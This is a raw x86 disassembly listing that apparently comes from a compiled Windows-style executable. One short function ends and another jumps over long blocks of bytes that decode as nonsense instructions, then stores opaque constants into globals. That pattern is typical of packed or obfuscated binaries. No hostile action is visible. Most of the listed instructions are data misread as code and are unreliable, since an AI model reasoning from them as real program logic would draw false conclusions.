  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x3c
  40f16c:	inc    eax
  40f16d:	(bad)  
  40f16e:	sub    BYTE PTR [eax],ah
  40f170:	mov    dh,0x7e
  40f172:	jle    0x40f168
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f1b1
  40f178:	inc    edx
  40f179:	ss aas 
  40f17b:	add    eax,0x412df068
  40f180:	pop    esi
  40f181:	scas   eax,DWORD PTR es:[edi]
  40f182:	popa   
  40f183:	shl    DWORD PTR [ebx+0x7a],0xa3
  40f187:	mov    bl,0x93
  40f189:	das    
  40f18a:	jne    0x40f14b
  40f18c:	inc    edx
  40f18d:	jle    0x40f13e
  40f18f:	rol    BYTE PTR [eax+0x3bf872dc],cl
  40f195:	test   al,0xcd
  40f197:	stc    
  40f198:	add    al,0xba
  40f19a:	scas   al,BYTE PTR es:[edi]
  40f19b:	mov    esp,0xda0ccc59
  40f1a0:	loop   0x40f217
  40f1a2:	xchg   edx,eax
  40f1a3:	or     al,0x73
  40f1a5:	test   BYTE PTR [edx],ch
  40f1a7:	inc    cx
  40f1a9:	lods   eax,DWORD PTR ds:[esi]
  40f1aa:	sub    esi,DWORD PTR [ebx+0x43]
  40f1ad:	das    
  40f1ae:	jp     0x40f18e
  40f1b0:	xchg   ebx,eax
  40f1b1:	lahf   
  40f1b2:	lock push ecx
  40f1b4:	xchg   esp,eax
  40f1b5:	or     al,0xd5
  40f1b7:	lds    ecx,FWORD PTR [edx-0x7807f5a9]
  40f1bd:	cli    
  40f1be:	xchg   DWORD PTR [eax-0x37],ebx
  40f1c1:	pop    ecx
  40f1c2:	loop   0x40f1ce
  40f1c4:	inc    esp
  40f1c5:	pushf  
  40f1c6:	mov    esi,0x90f922b4
  40f1cb:	add    bl,BYTE PTR [ebx-0x47]
  40f1ce:	pop    es
  40f1cf:	mov    esi,0xfde0b6a6
  40f1d4:	leave  
  40f1d5:	xlat   BYTE PTR ds:[ebx]
  40f1d6:	add    al,0xd2
  40f1d8:	fnstcw WORD PTR [ebp-0x33]
  40f1db:	jg     0x40f1fc
  40f1dd:	mov    esp,esi
  40f1df:	and    al,BYTE PTR [ecx+0x75]
  40f1e2:	cmp    eax,0x46ed70b6
  40f1e7:	ja     0x40f232
  40f1e9:	mov    dl,0x9a
  40f1eb:	sbb    DWORD PTR [eax],esi
  40f1ed:	sbb    DWORD PTR [edi+0x17bf3],ebx
  40f1f3:	xor    BYTE PTR [esi],0xf5
  40f1f6:	jmp    0x40f1f8
  40f1f8:	(bad)  
  40f1f9:	retf   
  40f1fa:	adc    DWORD PTR [esi+ecx*1-0x32],ecx
  40f1fe:	cwde   
  40f1ff:	daa    
  40f200:	mov    ah,0xf7
  40f202:	mov    DWORD PTR [edx+ebx*8],edi
  40f205:	es shr al,1
  40f208:	sub    BYTE PTR [edi-0x1f],cl
  40f20b:	js     0x40f1d9
  40f20d:	jmp    0x8541:0xb387be5e
  40f214:	jp     0x40f20d
  40f216:	stos   BYTE PTR es:[edi],al
  40f217:	fwait
  40f218:	cs mov ebx,0x4efd799b
  40f21e:	mov    edi,0x9af0ce1a
  40f223:	fst    DWORD PTR [ebp-0x20]
  40f226:	or     BYTE PTR [ebp+0x69],dl
  40f229:	stc    
  40f22a:	cmp    ch,BYTE PTR [edx+0x132c15d4]
  40f230:	jne    0x40f247
  40f232:	aas    
  40f233:	dec    eax
  40f234:	(bad)
  40f237:	(bad)  
  40f238:	fild   DWORD PTR [ebx-0x75418cfa]
  40f23e:	xchg   esi,eax
  40f23f:	test   esi,ecx
  40f241:	jne    0x40f208
  40f243:	in     al,0xa9
  40f245:	or     BYTE PTR [edx+0x4f67102b],al
  40f24b:	xchg   esp,eax
  40f24c:	xchg   edx,eax
  40f24d:	mov    ch,0x19
  40f24f:	xchg   esp,eax
  40f250:	nop
  40f251:	mov    al,es:0x36c840e7
  40f257:	xchg   esi,eax
  40f258:	aas    
  40f259:	ss addr16 push esp
  40f25c:	and    eax,DWORD PTR [edx-0x61db22ea]
  40f262:	xchg   esi,eax
  40f263:	fsubp  st(2),st
  40f265:	mov    al,ds:0xe9aeb729
  40f26a:	push   ecx
  40f26b:	dec    ebp
  40f26c:	adc    al,ch
  40f26e:	or     al,0xba
  40f270:	fiadd  DWORD PTR [edi-0x1c]
  40f273:	ret    0x6418
  40f276:	repz out dx,eax
  40f278:	push   esi
  40f279:	push   0x472e496b
  40f27e:	push   edx
  40f27f:	or     bh,BYTE PTR [ebp-0x67]
  40f282:	xor    eax,0xb843400c
  40f287:	not    DWORD PTR [edx+0x58a86e22]
  40f28d:	mov    esi,0xeb5c797
  40f292:	fldcw  WORD PTR [eax]
  40f294:	mov    dh,0x53
  40f296:	jae    0x40f308
  40f298:	add    BYTE PTR [eax+0x7d478629],dl
  40f29e:	sub    bh,BYTE PTR [ebp+edx*4-0x69]
  40f2a2:	inc    eax
  40f2a3:	push   cs
  40f2a4:	push   esp
  40f2a5:	arpl   di,sp
  40f2a7:	gs inc edx
  40f2a9:	test   al,0xa7
  40f2ab:	sbb    ecx,0x7a
  40f2ae:	imul   esp,DWORD PTR [edx*4-0x7d6490e2],0xd3a162e1
  40f2b9:	test   eax,0x77594f21
  40f2be:	sbb    BYTE PTR [edi-0x7f],ah
  40f2c1:	pop    esi
  40f2c2:	test   DWORD PTR [eax+0x69],ebx
  40f2c5:	btc    eax,eax
  40f2c8:	fdivr  DWORD PTR [ecx+0x4c6dcbb3]
  40f2ce:	or     bl,dh
  40f2d0:	sbb    DWORD PTR [ecx-0x75],0xa0ae4a64
  40f2d7:	jmp    0x8f5c:0xabb98ae6
  40f2de:	adc    DWORD PTR [eax+0x3b60b5c7],0x32
  40f2e5:	or     al,0x5a
  40f2e7:	(bad)  
  40f2e8:	adc    eax,0xa42283e
  40f2ed:	int    0xfa
  40f2ef:	xchg   edx,eax
  40f2f0:	imul   ebx,ebp,0xff389c5f
  40f2f6:	lock sbb al,0xfb
  40f2f9:	adc    BYTE PTR [ecx],ch
  40f2fb:	pop    ds
  40f2fc:	and    eax,0xe1ddc7d
  40f301:	lahf   
  40f302:	lds    ecx,FWORD PTR [esi-0xc]
  40f305:	test   al,0x47
  40f307:	mov    eax,ds:0x8b843bc6
  40f30c:	xchg   ebx,eax
  40f30d:	dec    edi
  40f30e:	(bad)  
  40f30f:	fdivr  QWORD PTR [esi]
  40f311:	jecxz  0x40f2c8
  40f313:	sub    eax,edx
  40f315:	js     0x40f2f2
  40f317:	mov    eax,DWORD PTR [ecx]
  40f319:	fld    DWORD PTR [eax]
  40f31b:	cli    
  40f31c:	mov    edx,0x5ff4a184
  40f321:	repnz push edx
  40f323:	cmp    al,0x2a
  40f325:	nop
  40f326:	or     dl,0x78
  40f329:	popf   
  40f32a:	adc    BYTE PTR [eax-0x26],dl
  40f32d:	or     edx,eax
  40f32f:	retf   0xae5
  40f332:	fs cmp al,0x2f
  40f335:	ins    DWORD PTR es:[edi],dx
  40f336:	xchg   ebx,eax
  40f337:	add    ecx,DWORD PTR [ebx+0x1643d4ab]
  40f33d:	scas   eax,DWORD PTR es:[edi]
  40f33e:	in     al,dx
  40f33f:	(bad)  
  40f340:	shl    DWORD PTR [edx-0x2f2f6f43],1
  40f346:	dec    esi
  40f347:	jle    0x40f2d8
  40f349:	addr16 imul edi
  40f34c:	(bad)  
  40f34d:	pop    esp
  40f34e:	in     eax,dx
  40f34f:	pop    ecx
  40f350:	add    cl,bl
  40f352:	dec    edi
  40f353:	and    al,0xf6
  40f355:	mov    edx,0xb965d638
  40f35a:	add    ch,BYTE PTR [ebx+edi*1]
  40f35d:	dec    esp
  40f35e:	push   ecx
  40f35f:	retf   0x3d9e
  40f362:	xchg   ebp,eax
  40f363:	jo     0x40f304
  40f365:	ss pop eax
  40f367:	aam    0x45
  40f369:	gs js  0x40f31f
  40f36c:	pop    ebx
  40f36d:	inc    ebp
  40f36e:	in     al,dx
  40f36f:	jo     0x40f3d5
  40f371:	jmp    0x40f366
  40f373:	push   0xffffffa5
  40f375:	cmp    al,0x61
  40f377:	mov    edi,0xff53ff9
  40f37c:	fidiv  DWORD PTR [ebx-0x20]
  40f37f:	and    BYTE PTR [esi],ah
  40f381:	sbb    DWORD PTR [edi],ebx
  40f383:	aam    0xe6
  40f385:	push   edi
  40f386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f387:	mov    edi,0x4f2d144d
  40f38c:	fnstcw WORD PTR gs:[ebp+0x4362c4c2]
  40f393:	jle    0x40f3d7
  40f395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f396:	dec    ebx
  40f397:	sub    al,dh
  40f399:	(bad)
  40f39c:	std    
  40f39d:	imul   ebp,DWORD PTR [ecx-0x2f],0x26
  40f3a1:	sub    DWORD PTR [ecx-0xd48a9e8],0xfffffff5
  40f3a8:	xchg   ebx,eax
  40f3a9:	push   ss
  40f3aa:	jge    0x40f3a9
  40f3ac:	out    0x39,eax
  40f3ae:	jmp    0x9344930b
  40f3b3:	push   edx
  40f3b4:	nop
  40f3b5:	std    
  40f3b6:	pop    ds
  40f3b7:	ja     0x40f37e
  40f3b9:	cld    
  40f3ba:	ja     0x40f3b8
  40f3bc:	shl    BYTE PTR [esi-0x80],1
  40f3bf:	gs daa 
  40f3c1:	jle    0x40f394
  40f3c3:	in     eax,dx
  40f3c4:	jge    0x40f436
  40f3c6:	fs mov esi,0x2a4f8435
  40f3cc:	xor    al,0xee
  40f3ce:	mov    ds:0xa567b50b,eax
  40f3d3:	add    al,0xe5
  40f3d5:	pop    ebp
  40f3d6:	or     dh,BYTE PTR [ebx+0x777367ea]
  40f3dc:	retf   
  40f3dd:	push   esp
  40f3de:	push   eax
  40f3df:	fldenv [ecx]
  40f3e1:	lds    ebx,FWORD PTR [ebx]
  40f3e3:	cmp    DWORD PTR [esi],0x51
  40f3e6:	enter  0x7ff8,0x20
  40f3ea:	jecxz  0x40f43e
  40f3ec:	and    eax,0x1a0dcc2f
  40f3f1:	cmp    BYTE PTR ds:0x73dedf7c,0x73
  40f3f8:	fdivr  st,st(7)
  40f3fa:	pop    ecx
  40f3fb:	cmp    esi,DWORD PTR [eax-0x11c74971]
  40f401:	outs   dx,BYTE PTR ss:[esi]
  40f403:	bnd jae 0x40f430
  40f406:	loope  0x40f47c
  40f408:	jecxz  0x40f484
  40f40a:	xchg   DWORD PTR [ebp-0x7afddf4a],edi
  40f410:	xchg   edx,eax
  40f411:	out    dx,eax
  40f412:	and    eax,edx
  40f414:	mov    al,ds:0xe8209d7
  40f419:	jne    0x40f430
  40f41b:	adc    cl,BYTE PTR [ebp+0x79]
  40f41e:	cdq    
  40f41f:	add    al,0x16
  40f421:	pop    ds
  40f422:	mov    ch,0x29
  40f424:	(bad)  
  40f425:	jg     0x40f403
  40f427:	dec    ebx
  40f428:	pop    eax
  40f429:	mov    eax,edi
  40f42b:	out    dx,al
  40f42c:	jno    0x40f499
  40f42e:	je     0x40f3be
  40f430:	imul   esi,DWORD PTR fs:[ebp-0xae1ca8e],0x18
  40f438:	adc    al,BYTE PTR [ebx]
  40f43a:	int    0xc8
  40f43c:	sub    dl,BYTE PTR [ebp+0x27f80593]
  40f442:	pushf  
  40f443:	fldcw  WORD PTR [edx-0x53b996d4]
  40f449:	mov    eax,ds:0xa995c2a9
  40f44e:	and    DWORD PTR [ebp-0xf],edx
  40f451:	inc    esi
  40f452:	xchg   edi,eax
  40f453:	sbb    eax,0xf45d365b
  40f458:	push   DWORD PTR [ebx]
  40f45a:	aas    
  40f45b:	push   0xa9f09ca8
  40f460:	mov    al,ds:0x759cf05
  40f465:	mov    si,0xf017
  40f469:	dec    edx
  40f46a:	out    0x7c,eax
  40f46c:	inc    eax
  40f46d:	xchg   edi,eax
  40f46e:	jns    0x40f4ab
  40f470:	aam    0xb7
  40f472:	mov    dl,0x22
  40f474:	jp     0x40f4cd
  40f476:	adc    ecx,esp
  40f478:	jb     0x40f4d2
  40f47a:	mov    edi,0x982a1976
  40f47f:	cmp    eax,0x2d3d5f60
  40f484:	lods   al,BYTE PTR ds:[esi]
  40f485:	sbb    DWORD PTR [ebp-0x3d046f3e],esi
  40f48b:	pop    ss
  40f48c:	push   ecx
  40f48d:	dec    esp
  40f48e:	jecxz  0x40f420
  40f490:	(bad)  
  40f491:	cmc    
  40f492:	or     DWORD PTR [eax],0x75
  40f495:	jb     0x40f4fa
  40f497:	adc    ebp,DWORD PTR cs:[ebx]
  40f49a:	mov    dl,0x8e
  40f49c:	data16 shr bh,cl
  40f49f:	jnp    0x40f42e
  40f4a1:	setg   bl
  40f4a4:	aad    0x97
  40f4a6:	js     0x40f440
  40f4a8:	out    dx,eax
  40f4a9:	sub    edx,DWORD PTR [edi+0x3ca61b99]
  40f4af:	dec    esp
  40f4b0:	push   ecx
  40f4b1:	mov    cl,0x45
  40f4b3:	dec    ecx
  40f4b4:	xlat   BYTE PTR ds:[ebx]
  40f4b5:	push   es
  40f4b6:	or     eax,0xa2faa337
  40f4bb:	repnz xchg edi,eax
  40f4bd:	xor    BYTE PTR [edi+0x29],cl
  40f4c0:	xor    eax,0x53a740dd
  40f4c5:	add    ch,bl
  40f4c7:	(bad)  
  40f4c9:	pop    ss
  40f4ca:	ins    DWORD PTR es:[edi],dx
  40f4cb:	sbb    eax,0x9059ace0
  40f4d0:	add    dh,BYTE PTR [esi-0x1a]
  40f4d3:	xchg   esi,eax
  40f4d4:	leave  
  40f4d5:	pop    esi
  40f4d6:	sub    al,0x73
  40f4d8:	push   cs
  40f4d9:	jo     0x40f50d
  40f4db:	imul   esi,DWORD PTR [ecx-0x5eef287a],0xffffffe7
  40f4e2:	or     BYTE PTR [ebp+0x3e6f1d8],cl
  40f4e8:	cli    
  40f4e9:	add    eax,eax
  40f4eb:	je     0x40f501
  40f4ed:	push   ecx
  40f4ee:	push   ecx
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x4345fb,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43460b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4345d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4345ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43453f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43458b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x2d]
  40f561:	xchg   BYTE PTR [edx+0x7eb19e44],ch
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f52b
  40f56d:	xor    BYTE PTR [esi-0x29],0xe4
  40f571:	cmp    cl,ah
  40f573:	fsubr  st(1),st
  40f575:	sti    
  40f576:	xchg   BYTE PTR [edi+0x7ec1865b],ah
  40f57c:	sbb    dh,BYTE PTR [eax]
  40f57e:	sbb    esi,DWORD PTR [ebx+0x43]
  40f581:	gs mov ch,0x11
  40f584:	inc    ebp
  40f585:	mov    ds:0x3617500e,eax
  40f58a:	dec    eax
  40f58b:	sub    ecx,DWORD PTR [edx-0x3b]
  40f58e:	std    
  40f58f:	ds ins BYTE PTR es:[edi],dx
  40f591:	leave  
  40f592:	sbb    cl,ah
  40f594:	inc    edx
  40f595:	clc    
  40f596:	sbb    BYTE PTR [ebx+eiz*2-0x15db416a],cl
  40f59d:	or     eax,0xe1cffefe
  40f5a2:	ret    0x8bcc
  40f5a5:	xchg   esp,eax
  40f5a6:	inc    ebx
  40f5a7:	stc    
  40f5a8:	(bad)  
  40f5a9:	(bad)  
  40f5ab:	das    
  40f5ac:	mov    al,ds:0xe7fb5257
  40f5b1:	icebp  
  40f5b2:	inc    esi
  40f5b3:	mov    eax,0xdec154b9
  40f5b8:	add    al,bl
  40f5ba:	ret    0x2ebc
  40f5bd:	pushf  
  40f5be:	pop    esi
  40f5bf:	fisubr DWORD PTR [eax+0x76305acb]
  40f5c5:	call   0x6c7f:0xee32ddb4
  40f5cc:	xlat   BYTE PTR ds:[ebx]
  40f5cd:	pusha  
  40f5ce:	cdq    
  40f5cf:	test   al,0x4c
  40f5d1:	mov    dh,0xfc
  40f5d3:	pop    ebp
  40f5d4:	cs jnp 0x40f63f
  40f5d7:	jmp    0xcaf5eaf4
  40f5dc:	xchg   ecx,eax
  40f5dd:	xor    bh,BYTE PTR [eax+eiz*1-0x79]
  40f5e1:	test   al,0xff
  40f5e3:	pop    esp
  40f5e4:	rcl    cl,0x63
  40f5e7:	sub    BYTE PTR [eax+eiz*2-0x1ca68be4],bh
  40f5ee:	fistp  WORD PTR [bx+di-0x7]
  40f5f2:	push   ecx
  40f5f3:	dec    DWORD PTR [esi]
  40f5f5:	in     al,dx
  40f5f6:	ds pop edi
  40f5f8:	jb     0x40f620
  40f5fa:	mov    al,0x3e
  40f5fc:	xchg   esp,eax
  40f5fd:	mov    ah,0xc2
  40f5ff:	jne    0x40f5cc
  40f601:	sub    dl,BYTE PTR [esi+0x480b5bd]
  40f607:	jns    0x40f591
  40f609:	or     al,0xc6
  40f60b:	push   eax
  40f60c:	jnp    0x40f646
  40f60e:	pusha  
  40f60f:	leave  
  40f610:	mov    ebp,0x873ae2b2
  40f615:	mov    ebp,0x96d52442
  40f61a:	pushf  
  40f61b:	fwait
  40f61c:	pop    edi
  40f61d:	sbb    BYTE PTR [edi+0x17b890f4],cl
  40f623:	adc    DWORD PTR [eax-0x2c64f4a2],esp
  40f629:	out    dx,eax
  40f62a:	push   ebx
  40f62b:	xor    al,BYTE PTR [esi-0x3860e538]
  40f631:	test   BYTE PTR [eax],dl
  40f633:	test   eax,0x8499c75c
  40f638:	(bad)  
  40f639:	xchg   ecx,eax
  40f63a:	lahf   
  40f63b:	and    al,0x74
  40f63d:	sub    al,0x31
  40f63f:	call   0xc078d7c9
  40f644:	add    esp,edi
  40f646:	mov    DWORD PTR [ebx],ebp
  40f648:	sub    BYTE PTR [edx],cl
  40f64a:	ror    BYTE PTR [edi],0xc0
  40f64d:	dec    ebp
  40f64e:	and    cl,BYTE PTR [esp+ebp*1+0x7522c8ad]
  40f655:	dec    ecx
  40f656:	test   al,0x48
  40f658:	cmp    BYTE PTR [ebx],al
  40f65a:	or     ebx,DWORD PTR [edx+0x42]
  40f65d:	sbb    al,BYTE PTR [edx+ecx*2]
  40f660:	xor    esi,DWORD PTR [esi+ecx*8]
  40f663:	cld    
  40f664:	pop    ebx
  40f665:	add    esp,DWORD PTR [esp+edx*2-0x2c5b0aa9]
  40f66c:	out    dx,eax
  40f66d:	jge    0x40f5fb
  40f66f:	lds    ebp,FWORD PTR [ebp+ecx*4+0x9e2a3f4]
  40f676:	xchg   DWORD PTR [ebp+0x4e9ecd8d],ebp
  40f67c:	lahf   
  40f67d:	cmp    eax,0x17d73468
  40f682:	xlat   BYTE PTR ds:[ebx]
  40f683:	xor    BYTE PTR [ecx+0x674ca067],dh
  40f689:	repnz hlt 
  40f68b:	rol    DWORD PTR [esi+0x26],cl
  40f68e:	repnz xlat BYTE PTR ds:[ebx]
  40f690:	iret   
  40f691:	xor    dl,BYTE PTR [eax+0x64da7b26]
  40f697:	xor    edi,DWORD PTR [ecx+0x2]
  40f69a:	cmc    
  40f69b:	test   al,0x55
  40f69d:	jbe    0x40f6d4
  40f69f:	aam    0x9f
  40f6a1:	xchg   esi,eax
  40f6a2:	sahf   
  40f6a3:	scas   eax,DWORD PTR es:[edi]
  40f6a4:	jmp    0x40f626
  40f6a6:	arpl   WORD PTR ds:0x7493a043,bx
  40f6ac:	test   ecx,ebx
  40f6ae:	les    esi,FWORD PTR [ebx-0x76]
  40f6b1:	pop    ss
  40f6b2:	push   ecx
  40f6b3:	enter  0xb83,0xde
  40f6b7:	inc    edx
  40f6b8:	clc    
  40f6b9:	jecxz  0x40f6a8
  40f6bb:	pusha  
  40f6bc:	imul   esp,DWORD PTR [ebx-0x3e],0x8
  40f6c0:	pop    edi
  40f6c1:	adc    BYTE PTR [edx],dl
  40f6c3:	inc    eax
  40f6c4:	inc    ebx
  40f6c5:	out    0xce,eax
  40f6c7:	cmp    DWORD PTR [ecx-0x68],0x1529b757
  40f6ce:	mov    ebp,DWORD PTR [ecx]
  40f6d0:	mov    bl,0x2
  40f6d2:	lea    ebx,[eax]
  40f6d4:	call   0xbfeb:0x7d67b838
  40f6db:	dec    ecx
  40f6dc:	into   
  40f6dd:	sbb    ebx,DWORD PTR ds:0x75107d46
  40f6e3:	lods   al,BYTE PTR ds:[esi]
  40f6e4:	adc    al,0x13
  40f6e6:	rol    BYTE PTR [edx],1
  40f6e8:	cmp    ebp,ebp
  40f6ea:	pop    ebx
  40f6eb:	out    dx,eax
  40f6ec:	xor    bl,ch
  40f6ee:	frstpm(287 only) 
  40f6f0:	xor    DWORD PTR [edx-0x49],esp
  40f6f3:	dec    eax
  40f6f4:	and    BYTE PTR ds:0x33bcd55c,bl
  40f6fa:	mov    gs,ecx
  40f6fc:	mov    DWORD PTR [edx+edx*1-0x39876a9d],ecx
  40f703:	jecxz  0x40f713
  40f705:	pop    edx
  40f706:	pop    eax
  40f707:	mov    dl,0x24
  40f709:	jns    0x40f735
  40f70b:	jge    0x40f6d0
  40f70d:	mov    al,0xbc
  40f70f:	mov    ds:0xbc78ad86,al
  40f714:	jno    0x40f787
  40f716:	xor    bh,dl
  40f718:	fisubr WORD PTR cs:[edi+0x386cf0e5]
  40f71f:	xadd   DWORD PTR [edi+0x1685b251],eax
  40f726:	push   esi
  40f727:	sub    al,0xcb
  40f729:	call   0x2ba72a69
  40f72e:	xor    DWORD PTR [ebx+0x52],esp
  40f731:	iret   
  40f732:	mov    esi,edx
  40f734:	or     ecx,edi
  40f736:	mov    gs,WORD PTR [edi+0x5e4f32]
  40f73c:	and    edi,DWORD PTR [esi]
  40f73e:	jo     0x40f707
  40f740:	scas   al,BYTE PTR es:[di]
  40f742:	sbb    cl,dh
  40f744:	gs cli 
  40f746:	xchg   esi,eax
  40f747:	sub    DWORD PTR [eax],ebp
  40f749:	loop   0x40f6fa
  40f74b:	dec    ebx
  40f74c:	adc    eax,0x44101162
  40f751:	retf   
  40f752:	pop    edx
  40f753:	pop    edi
  40f754:	fucomi st,st(1)
  40f756:	retf   
  40f757:	js     0x40f71a
  40f759:	inc    edx
  40f75a:	jbe    0x40f797
  40f75c:	jg     0x40f7d7
  40f75e:	lods   al,BYTE PTR ds:[esi]
  40f75f:	sbb    al,0xa3
  40f761:	xchg   BYTE PTR [ebp+0x7e],bh
  40f764:	inc    edi
  40f765:	mov    al,BYTE PTR [edx]
  40f767:	xchg   esp,eax
  40f768:	xchg   esi,eax
  40f769:	test   BYTE PTR [ebp+eiz*4+0x37e1ce58],bl
  40f770:	clc    
  40f771:	add    edx,esi
  40f773:	popa   
  40f774:	pop    DWORD PTR ds:0xaa87902f
  40f77a:	add    al,0x48
  40f77c:	test   DWORD PTR [eax+0x1c1fc965],eax
  40f782:	push   es
  40f783:	(bad)  
  40f784:	cmp    BYTE PTR [eax+0x3bdbccda],bh
  40f78a:	imul   ebp,DWORD PTR [edx-0x6],0x77b6129b
  40f791:	fs stos BYTE PTR es:[edi],al
  40f793:	and    dh,BYTE PTR [ecx]
  40f795:	iret   
  40f796:	mov    dl,0xdd
  40f798:	sbb    DWORD PTR [edi],ebx
  40f79a:	scas   al,BYTE PTR es:[edi]
  40f79b:	mov    esp,0xd9e4c751
  40f7a0:	jge    0x40f74b
  40f7a2:	call   0xd9fd016a
  40f7a7:	sbb    al,0x64
  40f7a9:	jl     0x40f7aa
  40f7ab:	cs mov ds:0x17f6bab3,al
  40f7b2:	test   BYTE PTR [edi],bh
  40f7b4:	stos   DWORD PTR es:[edi],eax
  40f7b5:	ret    0xe953
  40f7b8:	adc    BYTE PTR [edi],bh
  40f7ba:	dec    ecx
  40f7bb:	aam    0x6f
  40f7bd:	mov    dl,0x43
  40f7bf:	pop    ebx
  40f7c0:	xchg   esp,eax
  40f7c1:	ins    DWORD PTR es:[edi],dx
  40f7c2:	and    al,0x40
  40f7c4:	sub    esi,DWORD PTR [edx]
  40f7c6:	lods   eax,DWORD PTR ds:[esi]
  40f7c7:	stos   BYTE PTR es:[edi],al
  40f7c8:	lods   eax,DWORD PTR ds:[esi]
  40f7c9:	jge    0x40f7cd
  40f7cb:	cdq    
  40f7cc:	leave  
  40f7cd:	scas   eax,DWORD PTR es:[edi]
  40f7ce:	ss test bl,0xa7
  40f7d2:	sbb    ebp,esp
  40f7d4:	mov    dh,0x6b
  40f7d6:	mov    al,ds:0xc15a1741
  40f7db:	sub    esi,DWORD PTR [esi-0x42]
  40f7de:	inc    ebx
  40f7df:	mov    ds:0x838a0a1c,eax
  40f7e4:	mov    bl,0x29
  40f7e6:	repnz xchg esi,eax
  40f7e8:	ror    DWORD PTR [ebp+edi*4-0x6f],0xe0
  40f7ed:	mov    cl,0xf3
  40f7ef:	sbb    ecx,DWORD PTR [eax-0x73]
  40f7f2:	xor    bh,dh
  40f7f4:	popa   
  40f7f5:	jns    0x40f81f
  40f7f7:	in     al,0x72
  40f7f9:	pop    eax
  40f7fa:	inc    ebx
  40f7fb:	je     0x40f83b
  40f7fd:	xchg   edi,eax
  40f7fe:	mov    esi,0x61db8f38
  40f803:	js     0x40f7c2
  40f805:	cmp    BYTE PTR [edx+0x1a14f394],cl
  40f80b:	ja     0x40f857
  40f80d:	je     0x40f82a
  40f80f:	cmp    BYTE PTR [edx+0x2f],dh
  40f812:	jl     0x40f86b
  40f814:	repnz push ebx
  40f816:	fidivr DWORD PTR [edi-0x9acd36c]
  40f81c:	xchg   edi,eax
  40f81d:	cmp    BYTE PTR [ebp-0x6a0a4282],ch
  40f823:	push   edi
  40f824:	jo     0x40f847
  40f826:	aad    0x19
  40f828:	mov    bh,0x6f
  40f82a:	cmp    ah,BYTE PTR [edx+0x5cbb18d2]
  40f830:	test   eax,0x2afdc06
  40f835:	xchg   ecx,eax
  40f836:	xchg   dl,ch
  40f838:	jl     0x40f8af
  40f83a:	sar    DWORD PTR [eax-0x2a],cl
  40f83d:	pop    esp
  40f83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83f:	rol    esp,1
  40f841:	or     DWORD PTR [edi-0x32],ebp
  40f844:	dec    ebp
  40f845:	icebp  
  40f846:	adc    al,0xd3
  40f848:	adc    BYTE PTR [eax+0x17669b15],ch
  40f84e:	outs   dx,DWORD PTR ds:[esi]
  40f84f:	cdq    
  40f850:	mov    ebx,0x5525e2d0
  40f855:	pop    es
  40f856:	add    bh,BYTE PTR [edx+0x5dcce150]
  40f85c:	and    ch,BYTE PTR [ebp+0x64]
  40f85f:	jne    0x40f8b4
  40f861:	push   ecx
  40f862:	aaa    
  40f863:	fdivr  QWORD PTR [ebx]
  40f865:	push   edx
  40f866:	mov    dh,0x34
  40f868:	in     al,0xbd
  40f86a:	hlt    
  40f86b:	mov    eax,ds:0x479a9de7
  40f870:	and    eax,0x4873387e
  40f875:	fimul  WORD PTR [edi+ebx*2-0x2a9b19a4]
  40f87c:	push   ds
  40f87d:	leave  
  40f87e:	in     eax,dx
  40f87f:	mov    al,ds:0xcf58026a
  40f884:	fnsave [esi]
  40f886:	pushf  
  40f887:	pop    edi
  40f888:	jl     0x40f827
  40f88a:	xor    ebp,DWORD PTR [ebx]
  40f88c:	xlat   BYTE PTR ds:[ebx]
  40f88d:	jecxz  0x40f8a4
  40f88f:	xchg   ah,al
  40f891:	in     eax,dx
